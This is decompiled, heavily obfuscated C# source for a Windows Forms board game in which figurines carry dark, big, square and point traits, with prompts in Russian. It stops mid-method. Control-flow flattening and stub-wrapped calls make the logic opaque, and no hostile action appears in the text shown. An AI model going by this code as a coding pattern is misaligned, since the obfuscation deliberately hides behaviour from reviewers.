using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = -1537319706;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xE48A76C2u) % 7u)
					{
					case 6u:
						num = ((int)num2 * -451200711) ^ -1411058259;
						continue;
					case 5u:
						Dark = dark;
						num = ((int)num2 * -303210268) ^ 0x654382EE;
						continue;
					case 3u:
						Big = big;
						num = (int)((num2 * 821533452) ^ 0x2DC28FD0);
						continue;
					case 2u:
						Square = square;
						num = (int)((num2 * 114149789) ^ 0x1466E425);
						continue;
					case 1u:
						Point = point;
						num = ((int)num2 * -331793967) ^ 0x4D0D90F3;
						continue;
					default:
						return;
					case 0u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
		while (true)
		{
			int num = 1278005454;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x638E0781u) % 3u)
				{
				case 2u:
					goto IL_0033;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0033:
				num = (int)(num2 * 1536780180) ^ -1479264058;
			}
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = 1122957141;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7FB47917u) % 3u)
				{
				case 2u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_000d:
				num = (int)(num2 * 211622915) ^ -1895888833;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 44469182;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x760B3348u) % 10u)
				{
				case 9u:
					num = (int)((num2 * 1234904586) ^ 0x3B84ED01);
					continue;
				case 8u:
					num = ((int)num2 * -375423727) ^ 0x72A799AF;
					continue;
				case 7u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 2049367429;
					continue;
				case 6u:
					num = (int)((num2 * 680703234) ^ 0x132B3B39);
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 837807195;
						num4 = 837807195;
					}
					else
					{
						num3 = 1765766148;
						num4 = 1765766148;
					}
					num = num3 ^ (int)(num2 * 1349340869);
					continue;
				}
				case 4u:
					Form1.smethod_15(timer1);
					num = (int)((num2 * 1224144900) ^ 0x58BBC0CE);
					continue;
				case 1u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 983902372;
					continue;
				}
				case 0u:
					Form1.smethod_14(menu);
					num = (int)((num2 * 15449209) ^ 0x5162B2DD);
					continue;
				default:
					return;
				case 2u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 1987875097;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xBF36ED8u) % 21u)
				{
				case 20u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					num = ((int)num2 * -906446988) ^ 0x45065D1;
					continue;
				case 19u:
				{
					int num7;
					if (num4 >= 4)
					{
						num = 1507098814;
						num7 = 1507098814;
					}
					else
					{
						num = 1566069753;
						num7 = 1566069753;
					}
					continue;
				}
				case 18u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = -219935650;
						num6 = -219935650;
					}
					else
					{
						num5 = -1590970056;
						num6 = -1590970056;
					}
					num = num5 ^ ((int)num2 * -610159542);
					continue;
				}
				case 17u:
					Paint_Board();
					num = (int)(num2 * 1947137343) ^ -1938223367;
					continue;
				case 16u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = ((int)num2 * -1398943604) ^ -884799281;
					continue;
				case 15u:
					num3++;
					num = ((int)num2 * -1070942324) ^ -1399705903;
					continue;
				case 14u:
					board = new Figurine[4, 4];
					num = (int)((num2 * 127353713) ^ 0x655AE267);
					continue;
				case 13u:
					storage = new Figurine[4, 4];
					num = ((int)num2 * -1895387580) ^ 0x1CE7C0A5;
					continue;
				case 12u:
					num3 = 0;
					num = 2140290213;
					continue;
				case 11u:
					num4 = 0;
					num = ((int)num2 * -1512037463) ^ 0x3575197E;
					continue;
				case 10u:
					num = ((int)num2 * -1082170296) ^ -1366554402;
					continue;
				case 9u:
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = ((int)num2 * -685715911) ^ -469532770;
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 772504059) ^ 0x2A6FF0A0);
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 1498671907) ^ -957442052;
					continue;
				case 5u:
					Paint_Storage();
					num = ((int)num2 * -1433699927) ^ -1885369751;
					continue;
				case 3u:
					num = 2085315437;
					continue;
				case 2u:
					num4++;
					num = (int)(num2 * 151330375) ^ -1049320419;
					continue;
				case 1u:
					num = (int)(num2 * 1349964168) ^ -90624207;
					continue;
				case 0u:
					flag = num3 < 4;
					num = 2063252693;
					continue;
				default:
					return;
				case 4u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		float num14 = default(float);
		bool dark = default(bool);
		int num4 = default(int);
		int num5 = default(int);
		float num16 = default(float);
		float num3 = default(float);
		bool flag2 = default(bool);
		Brush brush_ = default(Brush);
		Graphics graphics_ = default(Graphics);
		float num6 = default(float);
		bool flag = default(bool);
		while (true)
		{
			int num = 289572665;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x15F9354Au) % 40u)
				{
				case 39u:
					num = (int)((num2 * 1175918808) ^ 0x7AC612FB);
					continue;
				case 38u:
					num14 = 0.7f;
					num = 1219190243;
					continue;
				case 37u:
				{
					int num17;
					int num18;
					if (!dark)
					{
						num17 = 2048968520;
						num18 = 2048968520;
					}
					else
					{
						num17 = 146336551;
						num18 = 146336551;
					}
					num = num17 ^ ((int)num2 * -421956395);
					continue;
				}
				case 36u:
					num4++;
					num = 1855355757;
					continue;
				case 35u:
				{
					int num21;
					if (!board[num5, num4].Big)
					{
						num = 1321729732;
						num21 = 1321729732;
					}
					else
					{
						num = 545761444;
						num21 = 545761444;
					}
					continue;
				}
				case 33u:
				{
					float num15 = 1f - num14 * 0.9f / (float)Form1.smethod_27(2.0);
					num16 = (float)size * num14;
					num3 = (float)size * (num15 / 2f);
					num = 187539955;
					continue;
				}
				case 32u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1919166033) ^ -1963731248;
					continue;
				case 31u:
				{
					int num11;
					if (num4 >= 4)
					{
						num = 321648906;
						num11 = 321648906;
					}
					else
					{
						num = 1394633321;
						num11 = 1394633321;
					}
					continue;
				}
				case 30u:
					flag2 = num5 < 4;
					num = 461905969;
					continue;
				case 29u:
					num = (int)(num2 * 2019993118) ^ -67074231;
					continue;
				case 28u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -630915433) ^ -2142066586;
					continue;
				case 27u:
					num = 287805166;
					continue;
				case 26u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1394227244) ^ -62035652;
					continue;
				case 25u:
					num6 = num16 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1930083045) ^ 0x69D06A84;
					continue;
				case 24u:
					num5++;
					num = (int)((num2 * 1070859528) ^ 0x2C819854);
					continue;
				case 22u:
					num = ((int)num2 * -1116538193) ^ -2082792705;
					continue;
				case 21u:
					flag = board[num5, num4] != null;
					num = ((int)num2 * -702113147) ^ -1203499495;
					continue;
				case 20u:
					num = ((int)num2 * -876238558) ^ 0x77B5FE1B;
					continue;
				case 19u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -1169387403) ^ 0x5E1B2877;
					continue;
				case 18u:
					Form1.smethod_24(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = 979143164;
					continue;
				case 17u:
				{
					int num19;
					int num20;
					if (!board[num5, num4].Point)
					{
						num19 = 1074204474;
						num20 = 1074204474;
					}
					else
					{
						num19 = 1730111403;
						num20 = 1730111403;
					}
					num = num19 ^ (int)(num2 * 913410624);
					continue;
				}
				case 16u:
					num = 1347639950;
					continue;
				case 15u:
				{
					float num15 = 1f - num14 * 0.4f / (float)Form1.smethod_27(2.0);
					num3 = (float)size * (num15 / 2f);
					num6 = num16 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 1782851267;
					continue;
				}
				case 14u:
					num14 = 1f;
					num = ((int)num2 * -725445823) ^ 0x59057618;
					continue;
				case 13u:
				{
					int num12;
					int num13;
					if (!board[num5, num4].Square)
					{
						num12 = -233112884;
						num13 = -233112884;
					}
					else
					{
						num12 = -1115530090;
						num13 = -1115530090;
					}
					num = num12 ^ ((int)num2 * -1412665228);
					continue;
				}
				case 12u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1507637465) ^ -1596471941;
					continue;
				case 11u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = -176120920;
						num10 = -176120920;
					}
					else
					{
						num9 = -1350670683;
						num10 = -1350670683;
					}
					num = num9 ^ ((int)num2 * -718197107);
					continue;
				}
				case 10u:
					num = (int)((num2 * 2124529144) ^ 0x686B9E45);
					continue;
				case 9u:
					num = (int)(num2 * 358017353) ^ -1089067660;
					continue;
				case 8u:
					num = ((int)num2 * -1169176612) ^ -1744117359;
					continue;
				case 7u:
					dark = board[num5, num4].Dark;
					num = ((int)num2 * -1190974203) ^ 0x1D5223E4;
					continue;
				case 6u:
					num5 = 0;
					num = (int)(num2 * 1008182500) ^ -1171326548;
					continue;
				case 5u:
					num4 = 0;
					num = 2049614750;
					continue;
				case 4u:
					num = (int)((num2 * 268837832) ^ 0x7D72AACD);
					continue;
				case 3u:
					brush_ = Form1.smethod_26();
					num = 250812945;
					continue;
				case 2u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -1658999714;
						num8 = -1658999714;
					}
					else
					{
						num7 = -1035060616;
						num8 = -1035060616;
					}
					num = num7 ^ (int)(num2 * 1005283807);
					continue;
				}
				case 1u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = ((int)num2 * -704472420) ^ 0x29F6F766;
					continue;
				case 0u:
					Form1.smethod_28(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = ((int)num2 * -854022078) ^ 0xD64848D;
					continue;
				default:
					return;
				case 23u:
					break;
				case 34u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		Brush brush_ = default(Brush);
		Graphics graphics_ = default(Graphics);
		float num9 = default(float);
		float num10 = default(float);
		float num11 = default(float);
		float num7 = default(float);
		float num12 = default(float);
		int num8 = default(int);
		bool flag = default(bool);
		bool big = default(bool);
		bool point = default(bool);
		while (true)
		{
			int num2;
			int num3;
			if (num < 4)
			{
				num2 = 1908783215;
				num3 = 1908783215;
			}
			else
			{
				num2 = 1196736199;
				num3 = 1196736199;
			}
			while (true)
			{
				uint num4;
				switch ((num4 = (uint)num2 ^ 0x47A10DF0u) % 35u)
				{
				case 34u:
					brush_ = Form1.smethod_25();
					num2 = (int)(num4 * 434011593) ^ -774437579;
					continue;
				case 33u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num9, num9, num10, num10);
					num2 = (int)((num4 * 811359923) ^ 0x5A259B0B);
					continue;
				case 32u:
					num11 = 1f - num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num12 = (float)size * num7;
					num9 = (float)size * (num11 / 2f) - 4f;
					num2 = 1419220369;
					continue;
				case 31u:
				{
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num8]));
					int num20;
					int num21;
					if (!storage[num, num8].Dark)
					{
						num20 = 1261485118;
						num21 = 1261485118;
					}
					else
					{
						num20 = 571718720;
						num21 = 571718720;
					}
					num2 = num20 ^ ((int)num4 * -1063415267);
					continue;
				}
				case 30u:
				{
					int num17;
					if (num8 < 4)
					{
						num2 = 902299417;
						num17 = 902299417;
					}
					else
					{
						num2 = 362239539;
						num17 = 362239539;
					}
					continue;
				}
				case 28u:
					num8++;
					num2 = 280315925;
					continue;
				case 27u:
					num10 = num12 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num4 * -1780708626) ^ -918121194;
					continue;
				case 26u:
					num2 = (int)(num4 * 780732149) ^ -1767355073;
					continue;
				case 25u:
					num2 = (int)((num4 * 1876412386) ^ 0x291A5AA1);
					continue;
				case 24u:
					num8 = 0;
					num2 = 1427195074;
					continue;
				case 23u:
					num7 = 0.7f;
					num2 = 924026393;
					continue;
				case 22u:
					Form1.smethod_30((Control)(object)pictureBox[num, num8]);
					num2 = 1011365439;
					continue;
				case 21u:
					flag = storage[num, num8] != null;
					num2 = 1246337270;
					continue;
				case 20u:
					big = storage[num, num8].Big;
					num2 = 1940614803;
					continue;
				case 19u:
					Form1.smethod_24(graphics_, brush_, num9, num9, num10, num10);
					num2 = 1756505530;
					continue;
				case 18u:
				{
					int num18;
					int num19;
					if (!point)
					{
						num18 = 967125532;
						num19 = 967125532;
					}
					else
					{
						num18 = 1288318601;
						num19 = 1288318601;
					}
					num2 = num18 ^ (int)(num4 * 1799769247);
					continue;
				}
				case 17u:
					num2 = ((int)num4 * -1783085127) ^ -329103366;
					continue;
				case 16u:
					num7 = 1f;
					num2 = ((int)num4 * -903865727) ^ -1827448046;
					continue;
				case 15u:
				{
					int num15;
					int num16;
					if (!flag)
					{
						num15 = -675523177;
						num16 = -675523177;
					}
					else
					{
						num15 = -1765212674;
						num16 = -1765212674;
					}
					num2 = num15 ^ ((int)num4 * -1783651969);
					continue;
				}
				case 14u:
					num2 = 1908783215;
					continue;
				case 13u:
					num2 = (int)((num4 * 1749777210) ^ 0x7DEFEAE1);
					continue;
				case 12u:
					num2 = (int)(num4 * 1453817558) ^ -4946983;
					continue;
				case 11u:
					num11 = 1f - num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = 1671482042;
					continue;
				case 10u:
				{
					int num13;
					int num14;
					if (num8 < 2)
					{
						num13 = 2103424495;
						num14 = 2103424495;
					}
					else
					{
						num13 = 462207305;
						num14 = 462207305;
					}
					num2 = num13 ^ (int)(num4 * 520744989);
					continue;
				}
				case 9u:
					point = storage[num, num8].Point;
					num2 = ((int)num4 * -932981947) ^ -2082222079;
					continue;
				case 8u:
					num2 = (int)(num4 * 1830223829) ^ -315738830;
					continue;
				case 7u:
					num++;
					num2 = (int)(num4 * 1048028989) ^ -1433784656;
					continue;
				case 6u:
					brush_ = Form1.smethod_26();
					num2 = 1741778014;
					continue;
				case 5u:
					num9 = (float)size * (num11 / 2f) - 4f;
					num10 = num12 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num4 * -1223810602) ^ 0x61624B92;
					continue;
				case 4u:
					Form1.smethod_20(pictureBox[num, num8], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num8]), Form1.smethod_16((Control)(object)pictureBox[num, num8])));
					num2 = ((int)num4 * -668998775) ^ -314429811;
					continue;
				case 3u:
					Form1.smethod_28(graphics_, brush_, num9, num9, num10, num10);
					num2 = (int)(num4 * 808880459) ^ -1891654641;
					continue;
				case 2u:
					num2 = ((int)num4 * -963141104) ^ 0x1FC8F47E;
					continue;
				case 0u:
				{
					int num5;
					int num6;
					if (big)
					{
						num5 = -1113162340;
						num6 = -1113162340;
					}
					else
					{
						num5 = -1055684028;
						num6 = -1055684028;
					}
					num2 = num5 ^ (int)(num4 * 1227432109);
					continue;
				}
				default:
					return;
				case 1u:
					break;
				case 29u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		int num5 = default(int);
		bool flag = default(bool);
		int num7 = default(int);
		int num8 = default(int);
		int num6 = default(int);
		while (true)
		{
			int num = -1450188100;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB8BAAB60u) % 28u)
				{
				case 27u:
					num5 = 0;
					num = -1349389121;
					continue;
				case 26u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					step = 0;
					num = ((int)num2 * -1858626460) ^ 0x2907FBD3;
					continue;
				case 25u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = (int)(num2 * 181527413) ^ -494043592;
					continue;
				case 24u:
					Form1.smethod_36(timer1);
					num = (int)(num2 * 549092058) ^ -374215410;
					continue;
				case 23u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -652879041;
					continue;
				case 22u:
					num = ((int)num2 * -562455614) ^ 0xCA9CA7C;
					continue;
				case 20u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -338611546) ^ -1114007847;
					continue;
				case 19u:
					flag = num5 < 4;
					num = -1445121880;
					continue;
				case 18u:
					Form1.smethod_7((Control)(object)pictureBox[num7, num5], bool_0: true);
					num5++;
					num = -1349389121;
					continue;
				case 17u:
					num7 = 0;
					num = ((int)num2 * -1819279818) ^ -343355428;
					continue;
				case 16u:
				{
					int num10;
					int num11;
					if (!turn)
					{
						num10 = 554734377;
						num11 = 554734377;
					}
					else
					{
						num10 = 677572224;
						num11 = 677572224;
					}
					num = num10 ^ ((int)num2 * -1946048030);
					continue;
				}
				case 15u:
				{
					int num9;
					if (num7 < 4)
					{
						num = -1884051945;
						num9 = -1884051945;
					}
					else
					{
						num = -1181683150;
						num9 = -1181683150;
					}
					continue;
				}
				case 14u:
					Form1.smethod_5((Control)(object)borderBox[num8, num6], Color.Blue);
					num = ((int)num2 * -1652675321) ^ -1658022196;
					continue;
				case 13u:
					num8 = Form1.smethod_33(rnd, 4);
					num = -994166533;
					continue;
				case 12u:
					num = (int)(num2 * 245615050) ^ -1239672284;
					continue;
				case 11u:
					num = ((int)num2 * -1927385400) ^ 0xFC02EA7;
					continue;
				case 10u:
					num = ((int)num2 * -1698079544) ^ 0x6B14956F;
					continue;
				case 9u:
					num7++;
					num = (int)(num2 * 867834081) ^ -688276646;
					continue;
				case 7u:
					num6 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1295198610) ^ 0x6AF1B434;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 401853693) ^ 0x6DF2C25F);
					continue;
				case 5u:
					num = (int)(num2 * 1310426623) ^ -735595805;
					continue;
				case 4u:
					num = (int)((num2 * 57615852) ^ 0x770FC785);
					continue;
				case 3u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -490204439) ^ 0x6088796F;
					continue;
				case 2u:
					num = (int)(num2 * 1125523421) ^ -283602355;
					continue;
				case 1u:
					step = 1;
					num = ((int)num2 * -1810686334) ^ -2135069024;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 948325298;
						num4 = 948325298;
					}
					else
					{
						num3 = 1771820797;
						num4 = 1771820797;
					}
					num = num3 ^ (int)(num2 * 1326184904);
					continue;
				}
				default:
					return;
				case 21u:
					break;
				case 8u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = -636330118;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8679D6B1u) % 4u)
				{
				case 3u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = ((int)num2 * -440853510) ^ 0x1D10C66A;
					continue;
				case 1u:
					num = ((int)num2 * -1085072857) ^ 0x17916ABC;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		int num5 = default(int);
		int num10 = default(int);
		int num6 = default(int);
		int num3 = default(int);
		Point point = default(Point);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1247254479;
			while (true)
			{
				uint num2;
				int num9;
				switch ((num2 = (uint)num ^ 0x680F3F1Fu) % 23u)
				{
				case 22u:
					num5++;
					num = (int)(num2 * 1329091964) ^ -1855014057;
					continue;
				case 20u:
					num9 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num10, num6]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_0055;
				case 19u:
					num3++;
					num = ((int)num2 * -965552707) ^ -993518265;
					continue;
				case 18u:
					num6 = point.X / size;
					num = ((int)num2 * -714957683) ^ -447331352;
					continue;
				case 17u:
					num = (int)(num2 * 568760681) ^ -1971585327;
					continue;
				case 16u:
					Form1.smethod_5((Control)(object)borderBox[num10, num6], Color.Red);
					num = (int)((num2 * 884169663) ^ 0x17152B7B);
					continue;
				case 15u:
					Form1.smethod_5((Control)(object)borderBox[num3, num5], Color.White);
					num = 1201002789;
					continue;
				case 14u:
					if (storage[num10, num6] != null)
					{
						num = 908258291;
						continue;
					}
					num9 = 0;
					goto IL_0055;
				case 13u:
					flag = num5 < 4;
					num = 636396464;
					continue;
				case 12u:
					num5 = 0;
					num = 1363574095;
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 2110264180) ^ 0x1CBB615F);
					continue;
				case 10u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 345149584) ^ -2035557915;
					continue;
				case 9u:
				{
					int num13;
					int num14;
					if (!flag)
					{
						num13 = -1125318838;
						num14 = -1125318838;
					}
					else
					{
						num13 = -1563809745;
						num14 = -1563809745;
					}
					num = num13 ^ (int)(num2 * 1633993832);
					continue;
				}
				case 8u:
					num = ((int)num2 * -603653973) ^ 0xBCB9741;
					continue;
				case 7u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num10 = point.Y / size;
					num = ((int)num2 * -1237362103) ^ 0x26CB3435;
					continue;
				case 6u:
					num6 -= 4;
					num = (int)(num2 * 618946928) ^ -1540688871;
					continue;
				case 5u:
				{
					int num11;
					int num12;
					if (!flag2)
					{
						num11 = -366264545;
						num12 = -366264545;
					}
					else
					{
						num11 = -1819094934;
						num12 = -1819094934;
					}
					num = num11 ^ (int)(num2 * 680779369);
					continue;
				}
				case 4u:
					num3 = 0;
					num = (int)((num2 * 1661410792) ^ 0x25D27696);
					continue;
				case 3u:
				{
					int num7;
					int num8;
					if (num6 > 1)
					{
						num7 = -1882397891;
						num8 = -1882397891;
					}
					else
					{
						num7 = -2036717325;
						num8 = -2036717325;
					}
					num = num7 ^ ((int)num2 * -2110910370);
					continue;
				}
				case 2u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -2069015017) ^ 0x653490B5;
					continue;
				case 0u:
				{
					int num4;
					if (num3 < 4)
					{
						num = 933007729;
						num4 = 933007729;
					}
					else
					{
						num = 2111203247;
						num4 = 2111203247;
					}
					continue;
				}
				default:
					return;
				case 21u:
					break;
				case 1u:
					return;
					IL_0055:
					flag2 = (byte)num9 != 0;
					num = 1115276319;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		int num6 = default(int);
		int num5 = default(int);
		bool flag = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1537984186;
			while (true)
			{
				uint num2;
				int num12;
				switch ((num2 = (uint)num ^ 0x7BFE020Du) % 26u)
				{
				case 25u:
					num = (int)(num2 * 1927523855) ^ -1581474638;
					continue;
				case 24u:
					num = (int)((num2 * 1431774809) ^ 0x7BC7C6CB);
					continue;
				case 23u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)((num2 * 1805016103) ^ 0x27F689A1);
						continue;
					}
					num12 = 0;
					goto IL_0071;
				case 22u:
					num6++;
					num = ((int)num2 * -1215861119) ^ 0x310C3E5A;
					continue;
				case 21u:
					num5++;
					num = 377562547;
					continue;
				case 20u:
				{
					int num8;
					int num9;
					if (!flag)
					{
						num8 = 1423846405;
						num9 = 1423846405;
					}
					else
					{
						num8 = 193965617;
						num9 = 193965617;
					}
					num = num8 ^ ((int)num2 * -809094614);
					continue;
				}
				case 19u:
					num12 = ((board[num4, num3] == null) ? 1 : 0);
					goto IL_0071;
				case 18u:
					num = ((int)num2 * -719824469) ^ 0x1FCEF231;
					continue;
				case 17u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 948976711) ^ -1042094529;
					continue;
				case 16u:
					num = ((int)num2 * -456712909) ^ 0x1FA4C5B3;
					continue;
				case 15u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num6, num5]), num3 * size + 4, num4 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -1457723824) ^ -1254095051;
					continue;
				case 14u:
					num = (int)(num2 * 1713012886) ^ -572120550;
					continue;
				case 12u:
				{
					int num13;
					if (Form1.smethod_41((Control)(object)borderBox[num6, num5]) == Color.Blue)
					{
						num = 1341670070;
						num13 = 1341670070;
					}
					else
					{
						num = 841792244;
						num13 = 841792244;
					}
					continue;
				}
				case 11u:
					num3 = Form1.smethod_38(e) / size;
					num4 = Form1.smethod_39(e) / size;
					num = ((int)num2 * -1490713796) ^ 0x9B7F1A;
					continue;
				case 10u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1153894141) ^ -730638944;
					continue;
				case 9u:
					num5 = 0;
					num = 377562547;
					continue;
				case 7u:
					num6 = 0;
					num = (int)((num2 * 537356295) ^ 0x5CDF0BC6);
					continue;
				case 6u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = 1486021598;
						num11 = 1486021598;
